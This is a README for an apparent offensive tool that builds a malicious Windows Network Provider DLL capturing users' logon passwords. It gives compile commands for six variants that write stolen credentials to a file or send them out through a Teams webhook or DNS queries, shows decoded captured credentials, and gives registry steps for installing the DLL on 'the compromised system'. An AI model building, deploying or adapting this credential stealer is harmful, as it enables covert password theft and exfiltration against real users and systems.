# anp

These are tests to create Network Providers based on [NPPSpy2](https://github.com/gtworek/PSBits/tree/master/PasswordStealing/NPPSpy2) by [gtworek](https://github.com/gtworek). All credit goes to the original author - I'm simply adding some functionality to explore what works best, but I thought it could be interesting for someone so I made it public.

I will use Base64-encoding or AES-encryption in all examples with the following JSON-like structure to store the information: 

```json
{"timestamp":"TIMESTAMP","operation":"OPERATION","domain":"DOMAIN","username":"USERNAME","password":"PASSWORD"}
```


<br>

## 1. Store in a text file + Base64-encoding

The default path is "C:\Windows\Task\default.txt" but you can customize it using the macro /DFILE_PATH:

```powershell
cl /LD /DFILE_PATH=\"C:\\\\Windows\\\\Tasks\\\\custom_path.txt\" 1_textfile_base64.c crypt32.lib /link /OUT:anp.dll
```

This creates a file with a content similar to:

```bash
eyJ0aW1lc3RhbXAiOiIyMDI1LTA0LTE0IDEwOjI4OjM2Iiwib3BlcmF0aW9uIjoiUFdEX1VQREFURV9PTEQiLCJkb21haW4iOiJERVNLVE9QLTBONkc2OTYiLCJ1c2VybmFtZSI6InJpY2FyZG8iLCJwYXNzd29yZCI6InFxIn0=
eyJ0aW1lc3RhbXAiOiIyMDI1LTA0LTE0IDEwOjI4OjM2Iiwib3BlcmF0aW9uIjoiUFdEX1VQREFURV9ORVciLCJkb21haW4iOiJERVNLVE9QLTBONkc2OTYiLCJ1c2VybmFtZSI6InJpY2FyZG8iLCJwYXNzd29yZCI6InEifQ==
```

Which decoded is:

```json
{"timestamp":"2025-04-14 10:28:36","operation":"PWD_UPDATE_OLD","domain":"DESKTOP-0N6G696","username":"ricardo","password":"qq"}
{"timestamp":"2025-04-14 10:28:36","operation":"PWD_UPDATE_NEW","domain":"DESKTOP-0N6G696","username":"ricardo","password":"q"}
```

<br>

## 2. Store in a text file + AES-encryption

The default path is "C:\Windows\Task\default.txt" and the default AES password is "TEST1234", but you can customize it using the macros /DFILE_PATH and /DAES_PWD:

```powershell
cl /LD /DFILE_PATH=\"C:\\\\Windows\\\\Tasks\\\\custom_path.txt\" /DAES_PWD=\"TEST1234\" 2_textfile_aes.c crypt32.lib advapi32.lib /link /OUT:anp.dll
```

This creates a file with a content similar to:

```bash
gT5LdF8L+zoDlUKBYU0fASbUrBst/hsTltI8aqUyQiGcvev+CtoxnIV53AEM2hdv32TknPnleRUL8eUb4AtRjCOyN9P+tICa7t0BMQAE7FZt+Z+tGpq0unJOsvDQ2VGvcG1RzLL/QrMPUUYvIM1BcEmVPYI5/KZQpr5p+8dX2yrE40QEoN79OodAAflEbh0W
gT5LdF8L+zoDlUKBYU0fASbUrBst/hsTltI8aqUyQiGcvev+CtoxnIV53AEM2hdv0Euwo4lOajrIKowzxM2qflL7XE8KeenZ/7RHu2f7q0xnu/Cl9iGiwxWz9tkCZjD0BL5j9ysFRPla4tLGU2ThIlBeYQ9dVLGiKpZbtX8liXygU4A5o20iROUMR9Ajtojc
```

You can decrypt it using *decrypt_aes.py*:

```bash
python decrypt_aes.py gT5LdF8L+zoDlUKBYU0fASbUrBst/hsTltI8aqUyQiGcvev+CtoxnIV53AEM2hdv32TknPnleRUL8eUb4AtRjCOyN9P+tICa7t0BMQAE7FZt+Z+tGpq0unJOsvDQ2VGvcG1RzLL/QrMPUUYvIM1BcEmVPYI5/KZQpr5p+8dX2yrE40QEoN79OodAAflEbh0W
python decrypt_aes.py gT5LdF8L+zoDlUKBYU0fASbUrBst/hsTltI8aqUyQiGcvev+CtoxnIV53AEM2hdv0Euwo4lOajrIKowzxM2qflL7XE8KeenZ/7RHu2f7q0xnu/Cl9iGiwxWz9tkCZjD0BL5j9ysFRPla4tLGU2ThIlBeYQ9dVLGiKpZbtX8liXygU4A5o20iROUMR9Ajtojc
```

And you get:

```json
{"timestamp":"2025-04-14 11:20:18","operation":"PWD_UPDATE_OLD","domain":"DESKTOP-0N6G696","username":"ricardo","password":"qq"}
{"timestamp":"2025-04-14 11:20:18","operation":"PWD_UPDATE_NEW","domain":"DESKTOP-0N6G696","username":"ricardo","password":"q"}
```

<br>

## 3. Send to Teams webhook + Base64-encoding

There is not a default webhook url, you have to set the value using the macro /DWEBHOOK_URL:

```powershell
cl /LD /DWEBHOOK_URL=L\"https://...\" 3_webhook_base64.c crypt32.lib wininet.lib /link /OUT:anp.dll
```

The information is received in a similar way to option 1:

![imgteams1](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/refs/heads/master/images/anp/Screenshot_teams1.png)

<br>

## 4. Send to Teams webhook + AES-encryption

You have to set the webhook url value using the macro /DWEBHOOK_URL, the default AES password is "TEST1234" but you can customize it using /DAES_PWD:

```powershell
cl /LD /DWEBHOOK_URL=L\"https://...\" /DAES_PWD=\"TEST1234\" 4_webhook_aes.c crypt32.lib wininet.lib advapi32.lib /link /OUT:anp.dll
```

The information is received in a similar way to option 2:

![imgteams2](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/refs/heads/master/images/anp/Screenshot_teams2.png)


<br>

## 5. DNS exfiltration + Base64-encoding

This one is not ideal, as the maximum length for a subdomain is 63 characters so it requires multiple DNS queries. As a result, the logon process is delayed by a few seconds, making the slowdown noticeable in some cases.

There is not a default subdomain, you have to set the value using the macro /DSUBDOMAIN:

```powershell
cl /LD /DSUBDOMAIN=L\".SUBDOMAIN.DOMAIN.COM\" 5_dns_base64.c crypt32.lib /link /OUT:anp.dll
```

You can use [this repository](https://github.com/ricardojoserf/dns-exfiltration) for creating the necessary subdomains and the *dns_server.py* script to decode the received values.

```bash
python3 dns_server.py .SUBDOMAIN.DOMAIN.COM
```

![imgdns1](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/refs/heads/master/images/anp/Screenshot_dns1.png)

It also generates a log file with the subdomains and decoded values:

![imgdns2](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/refs/heads/master/images/anp/Screenshot_dns2.png)

<br>

## 6. DNS exfiltration + AES-encryption

You have to set the subdomain value using the macro /DSUBDOMAIN, the default AES password is "TEST1234" but you can customize it using /DAES_PWD:

```powershell
cl /LD /DSUBDOMAIN=L\".SUBDOMAIN.DOMAIN.COM\" /DAES_PWD=\"TEST1234\" 6_dns_aes.c crypt32.lib advapi32.lib /link /OUT:anp.dll
```

You can use the *dns_server.py* script again to receive resolved domains and store it in a file:

![imgdns3](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/refs/heads/master/images/anp/Screenshot_dns3.png)

And the *decrypt_aes.py* script to decrypt the values:

![imgdns4](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/refs/heads/master/images/anp/Screenshot_dns4.png)

<br>

--------------------

## Installation

You can follow the instructions in [NPPSpy](https://github.com/gtworek/PSBits/tree/master/PasswordStealing/NPPSpy) by [gtworek](https://github.com/gtworek), which can be summed up to:

- Copy the DLL to a path in the compromised system.

- Add a network provider name at the end of the "ProviderOrder" in `HKLM\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order`. For this example I will use "anp".

- Create a key with the format `HKLM\SYSTEM\CurrentControlSet\Services\<CHOSEN_NAME>\NetworkProvider`, for the example I will use `HKLM\SYSTEM\CurrentControlSet\Services\anp\NetworkProvider`.

  - Class = [REG_DWORD]2 - Always this value.

  - ProviderPath = [REG_EXPAND_SZ]"C:\Users\ricardo\Desktop\test.dll" - Path to the DLL.

  - Name = [REG_SZ]"anp" - The name you chose, in this case I will use "anp".
 
<br>

--------------------

## TO-DOs

- Implement more exfiltration techniques (PRs are welcome!)


<br>

--------------------

## References

- [NPPSpy2](https://github.com/gtworek/PSBits/tree/master/PasswordStealing/NPPSpy2) by [gtworek](https://github.com/gtworek) - Again, these are just adding other exfiltration to NPPSpy(2).
